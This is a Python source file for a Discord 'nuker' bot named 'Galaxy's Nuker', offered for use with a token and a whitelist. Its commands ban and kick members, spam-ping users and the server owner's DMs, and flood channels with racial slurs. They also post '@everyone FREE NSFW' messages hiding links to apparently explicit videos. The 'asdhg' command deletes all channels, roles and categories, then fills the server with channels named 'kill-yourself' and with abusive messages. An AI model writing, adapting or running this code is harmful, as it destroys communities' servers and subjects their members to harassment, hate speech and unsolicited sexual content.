import discord
from discord import app_commands
import asyncio
import time
import random
import emoji
import time
import json
import requests


  
with open("settings.json", "r") as f:
  record = json.load(f)



activity = discord.Activity(type=discord.ActivityType.watching, name="Heil-Galaxy!")

class aclient(discord.Client):

  def __init__(self):
    super().__init__(intents=discord.Intents.default())
    self.synced = False

  async def on_ready(self):
    await client.change_presence(status=discord.Status.dnd, activity=activity)
    await self.wait_until_ready()
    if not self.synced:
      await tree.sync()
      self.synced = True
      print(f"We have logged in as {self.user}.")
      print("\nAdvisory On How To Use:\n1. Change Token With Your Bot Token For The Bot To Run.\n2. Whitelist Yourself Or Anyone You Are Nuking With By Pasting Their ID In It.\n3. Do Not Do Anything With The 'Do Not Mind This' Signs, It May End Bad Otherwise.\n\n4. All Commands Have a Meaning:\n\n"+"\033[1m1. Flames: Ban Command.\n2. koiscsk: Kick Command.\n3. dsh: Direct Message Owner.\n4. sp: Spam Ping.\n5. nws: N-Word Spam.\n6. ss: Special Spam.\n7. sdosm: Spam Direct Message Owner Special Message.\n8. ns: NSFW Spam.\n9. nsall: NSFW Spam All Channels.\n10. ts: Thread Spam\n11. tsall: Thread Spam All Channels.\n12. es: Emoji Spam.\n13. esa: Emoji Spam All.\n14. asdhg: Nuke The Server.\n\nHave A Lot Of Fun Using: Galaxy's Nuker! 🌌\nThank You For Choosing Us.\033[1m")

client = aclient()
tree = app_commands.CommandTree(client)

##############################################
Token = record["Token"] ############## HOLY TOKEN ############################
############################################

############################
######## Do Not Mind This###
############################
ssdes =  [
    "https://cdn.discordapp.com/attachments/953013947039113336/973668993388929104/Horowo_vowol_v_tuguju_popku-spaces.im.mp4?size=4096",
    "https://cdn.discordapp.com/attachments/937684599507660850/1031554320723882065/4_5907905799740457897.mp4",
    "https://cdn.discordapp.com/attachments/765363939734847508/830081235731611658/video1.mov",
    "https://cdn.discordapp.com/attachments/822770240466321408/824789609887694848/80efc68b7faaf3418513782a10c2be37.mp4",
    "https://media.discordapp.net/attachments/785000532254130186/971221297499602984/7YaSYSI.mp4",
    "https://media.discordapp.net/attachments/785000532254130186/953851721728286730/video0-9.mov",
    "https://media.discordapp.net/attachments/785000532254130186/951057914842447892/UncomfortableSnappyBellfrog-mobile.mp4",
    "https://cdn.discordapp.com/attachments/1066265277983117352/1066271222847000606/HarshSalmonDodo-mobile.mov",
    "https://cdn.discordapp.com/attachments/1001618507236126740/1015746901544542239/video0-5.mp4",
  ]
############################
######## Do Not Mind This###
############################

role_amount = record["role_amount_spam"] # how many roles you want the bot to create
whitelist = record['whitelist'] #needed
server_invite = record["server_invite"] #optional



@tree.command(name="flames")
async def ban(ctx, user:discord.User):
  if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
  else:
    await user.ban()
    print(f"\033[1mBanned {user.name} From {ctx.guild.name}.\033[0m")

@tree.command(name="koiscsk")
async def kick(ctx, user:discord.User):
  if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
  else:
    await user.kick()
    print(f"\033[1mKicked {user.name} From {ctx.guild.name}.\033[0m")
  
@tree.command(name="ts")
async def threadspam(ctx, channel:discord.TextChannel, amount:int):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
      for _ in range(amount): 
          s = await channel.send("easy")
          asd = await s.create_thread(name="sick")
          print(f"\033[1mCreated Thread: {asd.name}\033[0m")

    print("\033[1mSuccesfully Created All Threads!\033[0m")


@tree.command(name="dsh")
async def dmowner(ctx):
  if ctx.user.id not in whitelist:
      await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
  else:
    guild = ctx.guild
    owner_id = guild.owner_id
    owner = await client.fetch_user(owner_id)

    if owner is not None:
        try:
            amount = record["owner_message_spam"]  # Replace with your wanted amount of messages to be sent
            for index, _ in enumerate(range(1, amount + 1)):
                await owner.send(f"{owner.mention} Get Yo DMS raided!!\n{server_invite}")
                print(f"\033[1mMessage {index+1} Sent To The Owner.\033[0m")

            print(f"\n\033[1mAll Messages Have Been Sent To {owner.name}.\033[0m")
        except discord.Forbidden:
            print(f"\033[1mI'm Unable To Direct Message {owner.name}.\033[0m")
    else:
        print(f"\033[1mI Didn't Find {owner.name} Sadly.\033[0m")




@tree.command(name="sp")
async def spamping(ctx, user:discord.User, times:int):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
     amount = times
     for _ in range(amount):
       c = ctx.channel
       await c.send(f"{user.mention}")
       print(f"\033[1mMessage Sent: @{user.name}\033[0m")

    print("\033[1mAll Messages Have Been Sent.\033[0m")

@tree.command(name="nws")
@discord.app_commands.choices(level=[
 app_commands.Choice(name="Nigga", value=1),
 app_commands.Choice(name="Nigger", value=2),
])
async def nws(ctx, level:discord.app_commands.Choice[int], amount:int):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
     if level.value == 1:
       c = ctx.channel
       for _ in range(amount):
         s = await c.send("Nigga")
         print(f"\033[1mSent Message: {s.content}\033[0m")
         

     elif level.value == 2:
       c = ctx.channel
       for _ in range(amount):
        s = await c.send("Nigger")
        print(f"\033[1mSent Message: {s.content}\033[0m")
         
    print("\033[1mAll Messages Have Been Sent.\033[0m")


@tree.command(name="ss")
async def specialspam(ctx, special:str, amount:int):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
     c = ctx.channel
     for _ in range(amount):
       s = await c.send(special)
       print(f"\033[1mSent Message: {s.content}\033[0m")

    print("\033[1mAll Messages Have Been Sent.\033[0m")
  

@tree.command(name="sdosm")
async def spamdmownerspecialmessages(ctx, speciality:str, times:int, ping:bool, invite:bool):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
     guild = ctx.guild
     owner = guild.owner_id
     asd = await client.fetch_user(owner)
     if ping and invite == True:
       for _ in range(times):
         s = await asd.send(f"{asd.mention}\n{speciality}\n{server_invite}")
         print(f"\033[1mSent Message To Owner:\n@{asd.name}\n{speciality}\n{server_invite}\033[0m")
         
      
     elif ping and invite == False:
       for _ in range(times):
         s = await asd.send(speciality)
         print(f"\033[1mSent Message To Owner: {s.content}\033[0m")
         

     elif ping == False and invite == True:
       for _ in range(times):
         s = await asd.send(f"{speciality}\n{server_invite}")
         print(f"\033[1mSent Message To Owner: {s.content}\033[0m")
         

     elif ping == True and invite == False:
       for _ in range(times):
        s = await asd.send(f"{asd.mention}\n{speciality}")
        print(f"\033[1mSent Message To Owner: {s.content}\033[0m")
         
     print("\033[1mAll Messages Have Been Sent.\033[0m")



@tree.command(name="ns")
async def nsfwspam(ctx, times:int):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
     gen = random.choice(ssdes)
     c = ctx.channel
     for _ in range(times):
       s = await c.send(f"@everyone\n**FREE NSFW**\n||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {random.choice(ssdes)}")
       print(f"\033[1mSent Message: {s.content}\033[0m")

    print("\033[1mAll Messages Have Been Sent.\033[0m")


@tree.command(name="nsall")
async def nsfwspamallchannels(ctx, times:int):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
     gen = random.choice(ssdes)
     for channel in ctx.guild.channels:
       for _ in range(times):
         s = await channel.send(f"@everyone\n**FREE NSFW**\n||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {random.choice(ssdes)}")
       print(f"\033[1mSent Message: {s.content}\033[0m")

    print("\033[1mAll Messages Have Been Sent.\033[0m")




@tree.command(name="tsall")
async def tsall(ctx):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
        amount = record["thread_spam_all_amount"]  # Set the desired amount of messages to send
        guild = ctx.guild
        channels = guild.text_channels

        for _ in range(amount):
            for channel in channels:
                s = await channel.send("easy")
                await s.create_thread(name="sick")

        await asyncio.sleep(1)  # Sleep for a second to allow threads to be created

        coroutines = [
            asyncio.gather(*[channel.send("sick") for _ in range(amount)])
            for channel in channels
        ]
        print("\033[1mStarted Spamming Threads In All Channels.\033[0m")
        await asyncio.gather(*coroutines)




@tree.command(name="es")
async def emojispam(ctx, text: str, amount: int, channel: discord.TextChannel):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
        emojified_text = ""
        for char in text:
            if char.isalpha():
                emoji_char = emoji.emojize(f":regional_indicator_{char.lower()}:")
                emojified_text += emoji_char + " "
            elif char.isdigit():
                emoji_char = emoji.emojize(f":{char}:")
                emojified_text += emoji_char + " "
            else:
                emojified_text += char + " "

        for _ in range(amount):
            await channel.send(emojified_text.strip())
            print(f"\033[1mEmoji Message Sent In: {channel.name}\033[0m")



@tree.command(name="esa")
async def emojispamall(ctx, text: str):
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Auhorized In Our Whitelist.")
    else:
        emojified_text = ""
        for char in text:
            if char.isalpha():
                emoji_char = emoji.emojize(f":regional_indicator_{char.lower()}:")
                emojified_text += emoji_char + " "
            elif char.isdigit():
                emoji_char = emoji.emojize(f":{char}:")
                emojified_text += emoji_char + " "
            else:
                emojified_text += char + " "
        guild = ctx.guild
        channels = guild.text_channels
        amount = record["emoji_spam_all_amount"]
        coroutines = [
            asyncio.gather(*[channel.send(emojified_text) for _ in range(amount)])
            for channel in channels
        ]
        print("\033[1mStarted Spamming Emoji Words In All Channels.\033[0m")
        await asyncio.gather(*coroutines)




MESSAGE_COUNT = record["message_amount"]

#check up 
async def send_messages(channel, message_content):
    for _ in range(MESSAGE_COUNT):
        await channel.send(message_content)
        print(f"\033[1mSent Message In: {channel.name}.\033[0m")
      
    print("\033[1mAll Messages Have Been Sent.\033[0m")


@tree.command(name="asdhg")
async def nuke(ctx):
    # Connect to the Discord API
    intents = discord.Intents.default()
    intents.typing = False  # Disable typing events for faster execution
    if ctx.user.id not in whitelist:
        await ctx.response.send_message("You Are Not Authorized In Our Whitelist.")
    else:
        guild = ctx.guild
        intents = discord.Intents.default()
        intents.typing = False
        channel_names = []
        print("Nuke Has Been Started.\n")
        server_names = [
            "Get Fucked",
            "Nuked",
            "Galaxy Was Here...",
        ]
        role_names = [
          "Galaxy Was Here...",
          "Nuked",
          "Monkeys",
          "kys",
          "FurryShit",
        ]
        response = requests.get("https://media.discordapp.net/attachments/1116684013663428668/1116706225061634069/Galaxy_Nuker.jpg")
        icon_bytes = response.content
        await ctx.guild.edit(icon=icon_bytes)
        print("\033[1mChanged Server Icon.\033[0m")
        await ctx.guild.edit(name=f"{random.choice(server_names)}")
        print(f"\033[1mNamed Server To {guild.name}.\n\033[0m")

        
        # Delete existing channels and categories
        for channel in ctx.guild.channels:
            await channel.delete()
            print(f"\033[1mDeleted Channel: {channel.name}.\033[0m")
        
        print("\033[1mAll Channels Are Done Being Deleted.\033[0m")

        for role in ctx.guild.roles:
          try:
           await role.delete()
           print(f"\033[1mDeleted Role: {role.name}.\033[0m")
          except discord.errors.HTTPException as e:
            if e.code == 50028:  # Invalid Role error code
              print(f"\033[1mRole '{role.name}' is invalid and cannot be deleted.\033[0m")



        
          
        for category in ctx.guild.categories:
            await category.delete()
            print(f"\033[1mDeleted Category: {category.name}.\033[0m")
        
        for voice_channel in ctx.guild.voice_channels:
            await voice_channel.delete()
        
        print("\033[1mAll Categories Have Been Deleted.\033[0m")

# create roles to annoy
        for _ in range(role_amount):
          asd = await ctx.guild.create_role(name=random.choice(role_names))
          print(f"\033[1mCreated Role: {asd}.\033[0m")

    guild = ctx.guild
    channel_names = []

    amount = record["channel_range"]
    for i in range(amount):
        channels = [
          "no-security",
          "nuked",
          "get-fucked",
          "giraffe-monkeys",
          "kill-yourself",
        ]
        channel_name = random.choice(channels)
        channel_names.append(channel_name)
        channel = await guild.create_text_channel(channel_name)
        print("\033[1mChannel Created\033[0m")

    # Send messages in all channels concurrently
    messages=[
      f"@everyone You Got Fucked Lmao!\n{server_invite}",
      f"@everyone It's Not That Bad Go Suck On Tits!\n{server_invite}",
      f"@everyone Dorito Bag jkk Get nuked\n{server_invite}",
      f"@everyone Oh My Gaah It's A Nuke! ```Yes, It Is A Nuke.```\n{server_invite}"
    ]
    message_content = random.choice(messages)
    
    channels = [channel for channel in guild.text_channels if channel.name in channel_names]
    coroutines = [send_messages(channel, message_content) for channel in channels]
    await asyncio.gather(*coroutines) 


  

client.run(Token)
